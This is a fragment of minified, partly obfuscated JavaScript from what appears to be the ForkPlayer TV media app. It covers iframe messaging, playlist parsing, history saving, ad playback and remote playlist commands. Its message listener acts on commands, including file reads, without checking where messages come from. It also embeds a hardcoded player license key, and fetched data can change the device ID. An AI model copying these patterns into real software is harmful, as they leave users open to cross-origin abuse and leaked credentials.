break}});return out};function rewrite(args){return args.reduce(function(args,a){if(0==a.indexOf('-X')){args.push('-X');args.push(a.slice(2))}else{args.push(a)}
return args},[])}
function parseField(s){return s.split(": ")}
function isURL(s){var res=s.match(/(^https?:\/\/)/g);if(res==null)
return!1;else return!0}
function ext_focus(b){console.log(select);if(b==null){handler="menu";oInset[insetActive].focused(0)}
handler="ext";try{$_("frame-id").contentWindow.postMessage({'cmd':'focus','text':''},"*")}catch(e){console.log(e)}}
function ext_close(){handler="menu";lI1I1IxFCIh1l01llYpr("ext","");$_("ext").style.display="none"}
var ccread=0;window.addEventListener('message',function(event){if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"&&(handler=="player"||handler=="qual")){uplayer[lIO1OIOlAQzl1Ol1lYpr].message(event);return}
console.log("IN MESSAGE: "+event.data.cmd+"="+event.data.text);var a=["ID","IDS","ts","servC","lastdata","hm"].concat(allfs).concat(["times","epg_set"]);if(event.data.cmd=="exit"||event.data.text==VK_RED){ext_close()}else if(event.data.cmd=="alert"){if(event.data.text.indexOf("playVideo:")==0){console.log("inner player");$_("ext").style.display="none";$_("frame-id").contentWindow.postMessage({'cmd':'innerplay','text':''},"*");ll0lIOsIoIIlOlYpr(event.data.text.split("playVideo: ")[1]);handler="player";console.log("handler "+handler);return}
if(event.data.text.indexOf("OPEN_VAST")>=0){}}else if(event.data.cmd=="keyHandler"){if(event.data.text==VK_PAGE_UP||event.data.text==VK_PAGE_DOWN){handler="menu";oInset[insetActive].focused(-1);$_("frame-id").contentWindow.postMessage({'cmd':'unfocus','text':''},"*")}else{handler="ext";keyHandler({'keycode':event.data.text})}}else if(event.data.cmd=="innerplay"){handler="player";keyHandler({'keycode':event.data.text})}else if(event.data.cmd=="Handler"){handler="menu";keyHandler({'keycode':event.data.text})}else if(event.data.cmd=="toinner"){if(event.data.text){handler="menu";oInset[insetActive].focused(-1)}}else if(event.data.cmd=="onload"){if(ifrrw){for(var i in a){$_("ifrrw").contentWindow.postMessage({'cmd':'read'+'File','text':a[i]},"*");if(i<4)$_("ifrrw").contentWindow.postMessage({'cmd':'read'+'FileC','text':a[i]},"*")}}}else if(event.data.cmd.indexOf("read"+"FileCcook")==0){FileObjC[event.data.cmd.substr(13)]=event.data.text}else if(event.data.cmd.indexOf("read"+"File")==0){ccread++;FileObj[event.data.cmd.substr(8)]=event.data.text;if(!inited){if(ccread>=a.length){if(prload)kjtYpr.kjtYpj();else ifrreaded=!0}
if(ccread==1)loadinfo("_FPSchitivanieNastroek_ <span id='numD'> </span> ...");lI1I1IxFCIh1l01llYpr("numD",ccread+"/"+a.length)}}else if(event.data.cmd=="display"&&$_("main").style.display!=event.data.text){$_("main").style.display=event.data.text;if(event.data.text=="none"){$_("ext").style.top="0px";$_("ext").style.height="100%";$_("frame-id").style.height="100%";$_("frame-id").style.overflowY="hidden";$_("frame-id").style.webkitTransform="scaleY(1.0)";$_("frame-id").style.transform="scaleX(1.0)";$_("frame-id").style.OTransform="scaleX(1.0)";$_("frame-id").style.msTransform="scaleX(1.0)";$_("frame-id").style.MozTransform="scaleX(1.0)"}else{$_("ext").style.top="43px";$_("frame-id").style.height="640px";$_("ext").style.height="640px";$_("frame-id").style.webkitTransform="scaleX(1.13)";$_("frame-id").style.transform="scaleX(1.13)";$_("frame-id").style.OTransform="scaleX(1.13)";$_("frame-id").style.msTransform="scaleX(1.13)";$_("frame-id").style.MozTransform="scaleX(1.13)"}}},!1);var emptyCh={"title":"_FPZdesPusto_","description":"","stream_url":"","logo_30x30":"","playlist_url":""};var xhrParse,abortedParse=!1,assyncTimer=null,selfpages={};function OpenUrl(url,n){if(n!=null){url.navigateurl=n}
oInset[insetActive].navigate(url)}
function OpenGoBack(){tmf()}
function collect(a,b){var d={};for(p in a){d[p]=a[p]}
for(p in b){d[p]=b[p]}
return d}
var xmlToJSON=(function(){this.version="1.3.4";var options={mergeCDATA:!0,grokAttr:!0,grokText:!0,normalize:!0,xmlns:!0,namespaceKey:'_ns',textKey:'_text',valueKey:'_value',attrKey:'_attr',cdataKey:'_cdata',attrsAsObject:!0,stripAttrPrefix:!0,stripElemPrefix:!0,childrenAsArray:!1};var prefixMatch=new RegExp(/(?!xmlns)^.*:/);var trimMatch=new RegExp(/^\s+|\s+$/g);this.grokType=function(sValue){if(/^\s*$/.test(sValue)){return null}
if(/^(?:true|false)$/i.test(sValue)){return sValue.toLowerCase()==="true"}
if(isFinite(sValue)){return parseFloat(sValue)}
return sValue};this.parseString=function(xmlString,opt){return this.parseXML(this.stringToXML(xmlString),opt)}
this.parseXML=function(oXMLParent,opt){for(var key in opt){options[key]=opt[key]}
var vResult={},nLength=0,sCollectedTxt="";if(options.xmlns&&oXMLParent.namespaceURI){vResult[options.namespaceKey]=oXMLParent.namespaceURI}
if(oXMLParent.attributes&&oXMLParent.attributes.length>0){var vAttribs={};for(nLength;nLength<oXMLParent.attributes.length;nLength++){var oAttrib=oXMLParent.attributes.item(nLength);vContent={};var attribName='';if(options.stripAttrPrefix){attribName=oAttrib.name.replace(prefixMatch,'')}else{attribName=oAttrib.name}
if(options.grokAttr){vContent[options.valueKey]=this.grokType(oAttrib.value.replace(trimMatch,''))}else{vContent[options.valueKey]=oAttrib.value.replace(trimMatch,'')}
if(options.xmlns&&oAttrib.namespaceURI){vContent[options.namespaceKey]=oAttrib.namespaceURI}
if(options.attrsAsObject){vAttribs[attribName]=vContent}else{vResult[options.attrKey+attribName]=vContent}}
if(options.attrsAsObject){vResult[options.attrKey]=vAttribs}else{}}
if(oXMLParent.hasChildNodes()){for(var oNode,sProp,vContent,nItem=0;nItem<oXMLParent.childNodes.length;nItem++){oNode=oXMLParent.childNodes.item(nItem);if(oNode.nodeType===4){if(options.mergeCDATA){sCollectedTxt+=oNode.nodeValue}else{if(vResult.hasOwnProperty(options.cdataKey)){if(vResult[options.cdataKey].constructor!==Array){vResult[options.cdataKey]=[vResult[options.cdataKey]]}
vResult[options.cdataKey].push(oNode.nodeValue)}else{if(options.childrenAsArray){vResult[options.cdataKey]=[];vResult[options.cdataKey].push(oNode.nodeValue)}else{vResult[options.cdataKey]=oNode.nodeValue}}}}else if(oNode.nodeType===3){sCollectedTxt+=oNode.nodeValue}else if(oNode.nodeType===1){if(nLength===0){vResult={}}
if(options.stripElemPrefix){sProp=oNode.nodeName.replace(prefixMatch,'')}else{sProp=oNode.nodeName}
vContent=xmlToJSON.parseXML(oNode);if(vResult.hasOwnProperty(sProp)){if(vResult[sProp].constructor!==Array){vResult[sProp]=[vResult[sProp]]}
vResult[sProp].push(vContent)}else{if(options.childrenAsArray){vResult[sProp]=[];vResult[sProp].push(vContent)}else{vResult[sProp]=vContent}
nLength++}}}}else if(!sCollectedTxt){if(options.childrenAsArray){vResult[options.textKey]=[];vResult[options.textKey].push(null)}else{vResult[options.textKey]=null}}
if(sCollectedTxt){if(options.grokText){var value=this.grokType(sCollectedTxt.replace(trimMatch,''));if(value!==null&&value!==undefined){vResult=value}}else if(options.normalize){vResult=sCollectedTxt.replace(trimMatch,'').replace(/\s+/g," ")}else{vResult=sCollectedTxt.replace(trimMatch,'')}}
return vResult}
this.xmlToString=function(xmlDoc){try{var xmlString=xmlDoc.xml?xmlDoc.xml:(new XMLSerializer()).serializeToString(xmlDoc);return xmlString}catch(err){return null}}
this.stringToXML=function(xmlString){try{var xmlDoc=null;if(window.DOMParser){var parser=new DOMParser();xmlDoc=parser.parseFromString(xmlString,"text/xml");return xmlDoc}else{xmlDoc=new ActiveXObject("Microsoft.XMLDOM");xmlDoc.async=!1;xmlDoc.loadXML(xmlString);return xmlDoc}}catch(e){return null}}
return this}).call({});if(typeof module!="undefined"&&module!==null&&module.exports)module.exports=xmlToJSON;else if(typeof define==="function"&&define.amd)define(function(){return xmlToJSON});function escapeHtml(text){var map={'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};return text.replace(/[&<>"']/g,function(m){return map[m]})}
function lI100QcCODOlllYpr(){var u=gV(curPage.global,"url");if(curPage.lIQ0Il1IlIb1Il1OYpr.indexOf("#submenu")>0)u="";if(u==""){if(curPage.lIQ0Il1IlIb1Il1OYpr.indexOf("obovse.ru")==-1||curPage.lIQ0Il1IlIb1Il1OYpr.indexOf("mylist.obovse.ru")>0)u=curPage.lIQ0Il1IlIb1Il1OYpr.replace(/(\?|&)?w_lang=.*/,"");else{for(var i in baseurl){if(curPage.lIQ0Il1IlIb1Il1OYpr.indexOf(i.replace("http://",""))>=0)u="file://localparse/"+baseurl[i]}}}
u=u.replace(/http:\/\/.*?\/obovse.ru\//,"file://");return u}
function getInfoUrl(url){if(url==null){url=gV(IlIOIO("lIQ0Il1IlIb1Il1OYpr")||gP("lIQ0Il1IlIb1Il1OYpr"))}
if(url.indexOf("/alexkdpulg.php?list=")>0)url=unescape(url.split("?list=")[1]);url=url.replace(/(\?|&)?w_lang=.*$/,"");return url}
var userTop={};function lI0lI1O1l1Pa100l0Ypr(o){try{if(Ill1110("is_private"))return;console.log("lI0lI1O1l1Pa100l0Ypr "+handler);var xu=gP().lIQ0Il1IlIb1Il1OYpr;var ICON=oInset[insetActive].getIcon();var TITLE=oInset[insetActive].get("title");var curPage=oInset[insetActive];if(oInset[insetActive].get("url",-2)=="about:blank"){var se=oInset[insetActive].get("s",-2);if(se>=0){var data=getVars("about:blank");if(se!=""&&!ICON.match(/1px\.png/))if(data.channels[se].source=="fav"&&gV(data.channels[se],"logo_30x30")==""){console.log("upd img to "+ICON);data.fav[data.channels[se].id].logo_30x30=ICON;setVars("start",data)}}}
if(!xu.match(/^(http|html:\/\/http|vk)/)||xu.match(/(#submenu|no_save)/)||is_ifr()||ll0l0loMtIlIOYpr()||gV(curPage.page.global,"cacheinfo")=="nocache"){console.log("NOT Save "+xu+"/"+gV(curPage.page.global,"url"));return}
if(handler=="menu"){console.log(o);if(!is_local(xu)&&!xu.match(/(#submenu|#archive|no_save|search=)/)&&!TITLE.match(/^Стр. (\d+) \/ (.*)$/)){var nx=1;var pu=oInset[insetActive].get("url",-2);if(pu=="about:blank"){var se=oInset[insetActive].get("s",-2);if(se>=0){var data=getVars("about:blank");if(se!=""&&!ICON.match(/1px\.png/))if(data.channels[se].source=="fav"&&gV(data.channels[se],"logo_30x30")==""){console.log("upd img to "+ICON);data.fav[data.channels[se].id].logo_30x30=ICON;setVars("start",data)}}
nx=6}else if(pu.match(/^http:\/\/spiderxml\.com($|#)/))nx=6;if(typeof userTop[xu]=="undefined")userTop[xu]={"c":nx,"title":TITLE,"logo_30x30":ICON,"tp":T.timestamp,"parser":oInset[insetActive].get("p"),"local":oInset[insetActive].get("l")};else{console.log("set usertop="+userTop[xu].c);userTop[xu].c+=1;userTop[xu].tp=T.timestamp}
kjtYpr.lll0Il11OxICbl1ll0Ypr("datas",llIl1I1HlMgNII1IO0Ypr(userTop))}else{console.log("propusk usertop ")}
if(gV(l1OII11MlI01IYpr[0],"xml_url")!=xu){l1OII11MlI01IYpr.unshift({"xml_url":xu,"type":gV(o.parentCh,"type"),"model":model,"hardware":kjtYpr.hardware,"time":T.timestamp,"title":TITLE,"icon":ICON})}}else if(handler=="player"){if(getSelect()>=0){if(gV(l1OII11MlI01IYpr[0],"xml_url")==xu&&gV(l1OII11MlI01IYpr[0],"select")==getSelect()){l1OII11MlI01IYpr[0].start_time=curTime}else l1OII11MlI01IYpr.unshift({"xml_url":xu,"model":model,"hardware":kjtYpr.hardware,"time":T.timestamp,"select":getSelect(),"ch":{"logo_30x30":curPage.curCh("logo_30x30"),"title":curPage.curCh("title"),"play_url":playUrl,"stream_url":curPage.curCh("stream_url"),"parser":curPage.curCh("parser"),"ident":playElement.ident,"start_time":curTime,"total_time":totalTime},"title":TITLE,"icon":ICON})}}
if(l1OII11MlI01IYpr.length>100)l1OII11MlI01IYpr.splice(100,1);kjtYpr.lll0Il11OxICbl1ll0Ypr("history",llIl1I1HlMgNII1IO0Ypr(l1OII11MlI01IYpr))}catch(e){console.log(e);kjtYpr.popUp("Error save history<br>"+e.message,2200)}}
function incID(){kjtYpr.REQUEST_ID++;console.log("NEW REQ ID="+kjtYpr.REQUEST_ID);return kjtYpr.REQUEST_ID}
function pUrl(u,m){if(m==null)m="http:";if(typeof u=="undefined")return"";else if(u.indexOf("//")==0)return m+":"+u;else if(u.indexOf("http")==0)return u;return u}
var incpage=0;var FXMLPage={create:function(){var c=Object.create(this);c.channels=[];c.request_id=null;c.menu=[];c.style={};c.lIQ0Il1IlIb1Il1OYpr="";c.URL_REQUEST="";c.group=[];c.IFRAMES=[];c.IFRAMES_INSERT=0;c.curCh=null;c.parentCh=null;c.REQUEST_XXX=0;c.source="";c.is_iptv=0;c.hideRight=0;c.REQUEST_ID=null;c.global={};c.lI1101I0v1OO1OIYpr=null;c.typeList="list";c.xhrParse=null;c.abortedParse=!1;c.assyncTimer=null;c.lI1lI1d0HQAI01OOYpr=null;c.sPos={}
c.sPosX=0;c.sPosY=0;c.CAS=[];c.count=0;c.posX=0;c.posY=0;c.canceled=0;c.SEARCH_TEMPL="";incpage++;c.inc=incpage;c.input={};c.l1IOIl100j1fXIlIIYpr=0;c.is_mark=0;c.is_mark_array={};c.ERR=null;return c},toTags:function(k,t){for(var i=0;i<t.length;i++)if(typeof k[t[i]]=="undefined")k[t[i]]="";return k},detChxxx:function(v){if(kjtYpr.GL.passwordkey!=""&&kjtYpr.Password!=kjtYpr.GL.passwordkey){if(v.playlist_url!="submenu"&&gV(v,"type")!="enterurl"&&(is_xxx(v.stream_url)||is_xxx(v.playlist_url)||is_xxx(v.title)||is_xxx(v.group))){console.log("title is xxx");this.REQUEST_XXX=1;showParrent();return 1}
if(gV(v,"is_parent_lock")=="1"){this.REQUEST_XXX=1;console.log("is_parent_lock is xxx");showParrent();return 1}}},cancel:function(){var c=this;if(typeof c.lI1101I0v1OO1OIYpr.page=="undefined")c.lI1101I0v1OO1OIYpr.page=c;console.log("cancel "+c.inc+" "+c.lIQ0Il1IlIb1Il1OYpr);c.canceled=1;clearTimeout(c.tTimer);if(c.xhr!=null)c.xhr.abort();if(c.lI1101I0v1OO1OIYpr.page.canceled)$_("page_load").src=_img('_ST_page_reload.png');delete c.lI1101I0v1OO1OIYpr.loadPage;sethash()},oncomplete:function(pq){try{var c=this,data=null;if(c.canceled){console.log("canceled o");return}
var s=gV(pq,"source");console.log(s);c.source=s;var xml_url=c.lIQ0Il1IlIb1Il1OYpr;if(!c.l1IOIl100j1fXIlIIYpr){if(s=="-histback-"){c.cancel();pq.lI1101I0v1OO1OIYpr.reload();return}
if(s=="-histback1-"){c.cancel();pq.lI1101I0v1OO1OIYpr.navigateHist(-2);return}}
if(gV(pq.elCh,"local")=="html"){$_("ext").style.display="block";lI1I1IxFCIh1l01llYpr("ext",'<iframe onerror="console.log("IFR");console.log(this);" id="frame-id" style="margin-top: 0px; border:none; background-color:black;" width="1280" height="640" src="'+xml_url+'" />');kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен сайт в iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);handler="ext";return}else if((s.indexOf("<channel>")>0||s.indexOf("<items>")>0)&&s.indexOf('"channels":[')==-1&&s.indexOf('#EXTINF:')==-1){console.log("parse xml");data=lO11O1OWEQ0I0Ypr(s)}else if(apijsUrl==""&&s.indexOf("#EXTINF:")>-1){console.log("parse m3u");data=lIO1OOl0uurb1l1l0Ypr(s,xml_url);if(data.channels.length<1)data=l0QO11lOz0bfh10l0Ypr(s)}else if(c.URL_REQUEST.indexOf("45397/MediaServer")>0){console.log("parse hms");kjtYpr.GL.hms=xml_url.substr(7,xml_url.indexOf(":45397")-1);console.log("hms1="+kjtYpr.GL.hms);data=parsehms(s)}else if(c.URL_REQUEST.indexOf("http://"+getip("torrserve")+"/")===0){console.log("parse torrserve");data=lOIO1YryQD11lOYpr(s,c.URL_REQUEST)}else if(c.URL_REQUEST.indexOf("http://"+getip("acestream")+"/server/api")===0){console.log("parse ace");data=l10O0lgLzq11I1OYpr(s,c.URL_REQUEST)}else if(s.indexOf("<track>")>0&&s.indexOf('<location>')>0){console.log("parsexspf");data=parsexspf(s)}else{console.log("parse json");data=l0QO11lOz0bfh10l0Ypr(s);if(data==null){var s1=s.replace(/[\r\n]/g,"").match(/^(.*?)([\{\[].*[\}\]])/);if(s1!=null){if(s1[1]!="")kjtYpr.inf(s1[1],600);data=l0QO11lOz0bfh10l0Ypr(s1[2])}}
if(data!=null)kjtYpr.typeSource="fxml";console.log(data);if(data==null&&xml_url.indexOf(".txt")>0)data={channels:lOOO0O01IIIXgoOIIO1Ypr(s)}}
if(pq.lllO000MuCMlO11Ypr=="selfReNewBookmark"){try{for(var i=0;i<data.channels.length;i++)if(data.channels[i].title==sel){curCh("stream_url",data.channels[i].stream_url);curCh()["parser"]="";if(orig_xml_url)play_mini(curCh("stream_url"));else kjtYpr.l1O0OOzczEvllIOYpr(lIO1OIOlAQzl1Ol1lYpr);return}}catch(e){selfpages[xml_url]=null;kjtYpr.inf("Ошибка получения ссылки с плейлиста, возможно он сейчас недоступен!",1500);console.log(e)}
selfpages[xml_url]=null;kjtYpr.inf(sel+" не найден в плейлисте!",1500);return}
if(typeof data!="object"||data==null){if(c.l1IOIl100j1fXIlIIYpr)data={};else{c.ERR=404;data={"title":c.lIQ0Il1IlIb1Il1OYpr,"before":"<div style='margin-top:30px;margin-left:200px;text-align:left;'><img style='margin-left: -20px;' width='90' src='"+icoerr+"' /><div style='font-weight:bold;font-size:120%;'>Не удается отобразить страницу</div>Проверьте, нет ли опечаток в адресе <span style='font-size:80%;'>"+c.lIQ0Il1IlIb1Il1OYpr+"</span><br>"+(s!=""?"Исходный код ответа: <br><div style='font-style: italic;margin: 5px;padding: 3px;max-height:110px;overflow-x:hidden;overflow-y:scroll;'><small>"+escapeHtml(s.substr(0,280))+"</small></div>":"")+"<br>Если все правильно, проверьте сеть Интернет или посмотрите в новостях - может сайт сейчас недоступен или на тех. работах<br><br></div>","typeList":"start","channels":[]};data.channels.push({"logo_30x30":"none","position":"hlink","title":"Назад","playlist_url":"cmd:historyback(1);"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Перезагрузить","playlist_url":c.lIQ0Il1IlIb1Il1OYpr,"description":xml_url+"<br>Нажмите, чтобы открыть ссылку<br> Или нажмите Меню / Добавить в закладки (стартовое меню), чтобы сохранить"});if(s.match(/(<html|<body)/))data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть как HTML","playlist_url":xml_url,"local":"html"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть анонимно","playlist_url":xml_url,"local":"direct"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть через RemoteFork","description":"RemoteFork link<br>_FPNeobhodimRemoteFork_","playlist_url":"http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(xml_url),"local":"direct"});data.icon="err"}
if(pl_serv<pl_count-1){pl_serv++}}
console.log("=RES DATA=");console.log(data);pq.data=data;c.toChannels(pq)}catch(e){xhr=null;console.log(e);kjtYpr.inf("_FPOshibkaObrabotki_:"+e,3000);if(e.toString().toLowerCase().indexOf("quota")!=-1){l1Il1QOv0e10I0Ypr()}
c.toChannels(pq)}},lIIl11110nmrsul1IOOIYpr:function(p){var c=this;POST_S="";if(c.lI1lI1d0HQAI01OOYpr!=null){console.log("aborted lI1lI1d0HQAI01OOYpr");delete c.lI1lI1d0HQAI01OOYpr}else{console.log("lI1lI1d0HQAI01OOYpr ok")}
if(c.canceled){console.log("canceled u");return}
var ch=p.ch;var tag=p.tag;var pars=ch[tag].split("|");pars[0]=gV(pars,0);pars[1]=gV(pars,1);pars[2]=gV(pars,2);var link=gV(pars,0);if(gV(pars,1)=="selfReNewBookmark"){if(gV(selfpages,link)!=""){statusbar("from cache "+pars[0],"link");c.oncomplete(selfpages[link],link,"selfReNewBookmark");return}}
if(is_parse_self(link,gV(lI1101I0v1OO1OIYpr.page,"lIQ0Il1IlIb1Il1OYpr"))||pars[1]=="selfReNewBookmark"||gV(ch,"addparserident")==1)
link=addident(link);c.lI1lI1d0HQAI01OOYpr=uHelper.create("direct|rf");c.lI1lI1d0HQAI01OOYpr.parse=function(s){console.log("res execParse");statusbar("off");if(s==null){if(!c.lI1lI1d0HQAI01OOYpr.is_remote()){kjtYpr.inf("_FPUse RemoteFork for parse this link_!",1500);l0OI10IRge011lO1Ypr()}
if(tag.indexOf("mb")!=0)return;else s=""}
if(s==""&&tag.indexOf("mb")!=0){kjtYpr.inf("Пустая ссылка "+tag+"!",1500);if(handler=="player")l1llOQI10lW1l_II101Ypr()}else{text=c.parserstr(pars,s);if(ch.playlist_url!=""){console.log("PARSE LENGTH "+text.length);if(ch.playlist_url.indexOf("=postmd5")>0){ch.postmd5=text;text="postmd5"}else if(text.length>9000&&ch.playlist_url.indexOf("#POST")==-1)kjtYpr.inf("Слишком длинный параметр GET, замените его на POST в случае ошибки обработки страницы!",1500);ch.playlist_url=ch.playlist_url.replace("md5orighash",text);if(tag.indexOf("mb")==0)ch.playlist_url=ch.playlist_url.replace("md5mbhash",encodeURIComponent(text));else ch.playlist_url=ch.playlist_url.replace("md5hash",encodeURIComponent(text))}
if(ch.stream_url!=""){if(ch.stream_url.indexOf("=postmd5")>0){console.log("stream post set 2");ch.postmd5=text;text="postmd5"}else if(text.length>9000)kjtYpr.inf("Слишком длинный параметр GET, замените его на POST в случае ошибки обработки ссылки!",1500);if(tag.indexOf("mb")==0)ch.stream_url=ch.stream_url.replace("md5mbhash",text);else ch.stream_url=ch.stream_url.replace("md5hash",text)}
ch[tag]="";var a_pq=p.pq;a_pq.elCh=ch;p.callback(a_pq)}}
console.log("lIIl11110nmrsul1IOOIYpr "+link);c.lI1lI1d0HQAI01OOYpr.get(link)},parserstr:function(pars,s){if(pars[2]==""&&pars[1]=="")var text=s;else if(pars[2]==""){x1=s.indexOf(pars[1])+pars[1].length;text=s.substr(x1)}else if(pars[1]=="RegExp"||pars[1]=="regexp"){s=s.replace(/\n/g,"").replace(/\r/g,"");try{regexp=new RegExp(pars[2],pars[3]);items=regexp.exec(s);var ind=parseInt(pars[4]);if(isNaN(ind))ind=0;text=items[ind]}catch(e){console.log(e)}}else if(pars[1].indexOf(".*?")>0||pars[2].indexOf(".*?")>0){s=s.replace(/\n/g,"").replace(/\r/g,"");try{pg=pars[1]+'(.*?)'+pars[2];regexp=new RegExp(pg,"i");items=regexp.exec(s);text=items[1]}catch(e){console.log(e)}}else{x1=(pars[1]=="")?0:s.indexOf(pars[1])+pars[1].length;x2=s.indexOf(pars[2],x1);text=s.substr(x1,x2-x1);console.log(x1);console.log(x2);console.log(text)}
return text},adv:function(pq){return 0;var elCh=pq.elCh;if(elCh.stream_url!=""&&!is_audio(elCh.stream_url)){{if(is_adult){rek_url="rek_on";is_adult=!1}
if(typeof elCh.advertising=="object"){l1llOQI10lW1l_II101Ypr();var tcount=0;function adend(){console.log("ad end");is_rek=!1;elCh.advertising="end";handler="menu";lI1I1IxFCIh1l01llYpr("jw","");$_("jw").style.display="none";$_("jw").style.zIndex="0";kjtYpr.l1O0OOzczEvllIOYpr(handmode,elCh)}
function adTimer(t){if(!is_rek)return;console.log("jw ad timer "+tcount);if(++tcount<10){rekLifeTimer=setTimeout(function(){adTimer()},1000)}else{console.log("jw ad err timer");adend()}}
adTimer();is_rek=!0;handler="player";rek_mode="jw";rek_type="user";kjtYpr.inf("LOAD AD(U)"+rek_q);kjtYpr.inf("LOAD AD(U)"+rek_q);$_("player").style.display="block";$_("QualCh").style.display="none";$_("main").style.display="none";$_("video").style.display="none";$_("jw").style.display="block";renderPlayer("adv");rekBox();jwplayer.key="qcXu/ZrwbXbRPW/tm47rDKqkZXcp1nsBqUuuGEoWKok=";jwplayer("jw").setup({"file":"http://195.88.208.101/rek_ivi.mp4",controls:!0,"height":"100%","width":"100%","autostart":!0,"androidhls":!1,"hlsjsdefault":!1,"skin":{"url":_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/skin.css"),"name":"myskin"},"advertising":elCh.advertising});jwplayer("jw").on("adBreakEnd",function(event){adend()});jwplayer("jw").on("setupError",function(event){adend()});jwplayer("jw").on("adTime",function(event){tcount=0});jwplayer("jw").on("ready",function(event){});jwplayer("jw").on("all",function(event){console.log("jw all");console.log(typeof event);console.log(event)});return 1}else if(gV(pq.elGlobal,"allvast")!=""){l1llOQI10lW1l_II101Ypr();handler="player";pstream=!1;paused=!1;statusbar("LOAD AD VAST "+rek_q);is_rek=!0;console.log("is_show_rek rek_q="+rek_q);rekLife();rek_mode=pq.mode;is_adult=!0;rek_type="user";kjtYpr.inf("LOAD AD(U)"+rek_q);l1lllUlxeIO1O1OYpr(pq.elGlobal.allvast,"","start");pq.elGlobal.allvast="";return 1}
if(is_show_rek()&&!lIl11llQV1Z1NOO0IYpr(12)){l1llOQI10lW1l_II101Ypr();handler="player";pstream=!1;paused=!1;statusbar("LOAD AD "+rek_q);is_rek=!0;console.log("is_show_rek rek_q="+rek_q);rekLife();rek_mode=pq.mode;rek_q++;rek_last=T.inetTime;kjtYpr.lll0Il11OxICbl1ll0Ypr("rek",T.inetTime);rek_type="youtube";if(Math.random()>0.5)l1lllUlxeIO1O1OYpr('http://195.88.208.101/rek_ivi.mp4','','start');else l1lllUlxeIO1O1OYpr('http://195.88.208.101/rekmegogo.mp4','','start');return 1}}}},dataconfirm:null,handlerData:function(pq){var c=this;try{var data=pq.data;var curPage=gP();if(data==null)data={};var orig_xml_url=c.lIQ0Il1IlIb1Il1OYpr;console.log(pq);if(typeof data.setcookie!="undefined"){console.log("setcookie");var dm=orig_xml_url.match(rCook);if(dm!=null){dm=dm[3]}else dm="localhost";console.log("dm="+dm);console.log(data.setcookie);for(var i in data.setcookie){if(typeof llQOIO10IiuQlOl0Ypr[dm]=="undefined")llQOIO10IiuQlOl0Ypr[dm]={};llQOIO10IiuQlOl0Ypr[dm][i]=data.setcookie[i];console.log(llIl1I1HlMgNII1IO0Ypr(llQOIO10IiuQlOl0Ypr))}
if(!Ill1110("is_private"))kjtYpr.lll0Il11OxICbl1ll0Ypr("storage",llIl1I1HlMgNII1IO0Ypr(llQOIO10IiuQlOl0Ypr),!0)}
if(gV(pq.elCh,"filter")!=""&&$_("vk").style.display!="none"&&gV(data,"cmd").indexOf("stop()")==-1)returnVK(1);if(typeof data.confirm!="undefined"){console.log("data[confirm] ");var dm=orig_xml_url.match(rCook);var ttl=gV(data.confirm,"title");if(dm!=null)ttl="<div style='font-weight: bold;background: #3b3e40;'>"+dm[3]+"</div>"+ttl;confirmed.create(ttl);confirmed.fun0=function(){oInset[insetActive].navigate(data.confirm.channel)};return 1}
if(gV(data,"info")!=""){var dm=orig_xml_url.match(rCook);if(dm!=null){data.info="<div style='font-weight: bold;background: #3b3e40;'>"+dm[3]+"</div>"+data.info}
confirmed.create(data.info)}
if(typeof data.notify!="undefined"){var dm=orig_xml_url.match(rCook);if(dm!=null){data.notify=dm[3]+":"+data.notify}
kjtYpr.inf(data.notify,2200)}
if(gV(data.cmd)!=""){console.log("cmd:"+data.cmd);var brea=0;if(data.cmd.indexOf("updateLogin(")>=0){updateLogin()}
if(data.cmd.indexOf("setID(")>=0){var m=data.cmd.match(/setID\((.*?),(.*?)\)/);console.log(m);if(m==null)kjtYpr.inf("Error format setID. Must be setID(newID,userSignature)",1500);else if(user==null)kjtYpr.inf("Error setID. Must be logged in ForkPlayer",1500);else if(user.md5!=m[2])kjtYpr.inf("Error userSignature setID",1500);else{kjtYpr.nmc=m[1];confirmed.create("Внимание! Если идентификатор "+kjtYpr.nmc+" все еще используется на каком-то другом устройстве то оно может потерять доступ к приложению. <br> Сменить идентификатор этого устройства на "+kjtYpr.nmc,"_FPAre you sure_?").fun0=function(){if(kjtYpr.nmc.length==12||kjtYpr.nmc.length==14){kjtYpr.lll0Il11OxICbl1ll0YprC("oID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0Ypr("oID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0YprC("ID",kjtYpr.nmc);kjtYpr.lll0Il11OxICbl1ll0Ypr("ID",kjtYpr.nmc);kjtYpr.lll0Il11OxICbl1ll0YprC("ID",kjtYpr.nmc);kjtYpr.mac=kjtYpr.serial=kjtYpr.nmc;kjtYpr.inf("OK set ID "+kjtYpr.mac,2200);updateLogin();oInset[insetActive].reload()}else kjtYpr.inf("Error format ID",1500)}}
return 1}
if(data.cmd.indexOf("historyclear(")>=0){var m=data.cmd.match(/historyclear\((.*?),(.*?)\)/);console.log(m);if(m==null)kjtYpr.inf("Error format historyclear. Must be historyclear(days,userSignature)",1500);else if(user==null)kjtYpr.inf("Error historyclear. Must be logged in ForkPlayer",1500);else if(user.md5!=m[2])kjtYpr.inf("Error userSignature historyclear",1500);else{if(m[1]==-1)l1OII11MlI01IYpr=[];else{var nh=[];for(var i in l1OII11MlI01IYpr){if(l1OII11MlI01IYpr[i].time<T.timestamp-3600*24*m[1])nh.push(l1OII11MlI01IYpr[i])}
l1OII11MlI01IYpr=nh;kjtYpr.lll0Il11OxICbl1ll0Ypr("history",llIl1I1HlMgNII1IO0Ypr(l1OII11MlI01IYpr))}}}
if(data.cmd.indexOf("historyback(")>=0){var m=data.cmd.match(/historyback\((.*?)\)/)[1];if(m>0)m*=-1;m--;console.log("cmd historyback "+m);c.lI1101I0v1OO1OIYpr.navigateHist(m,data.cmd.indexOf("reload(")>=0);return 1}
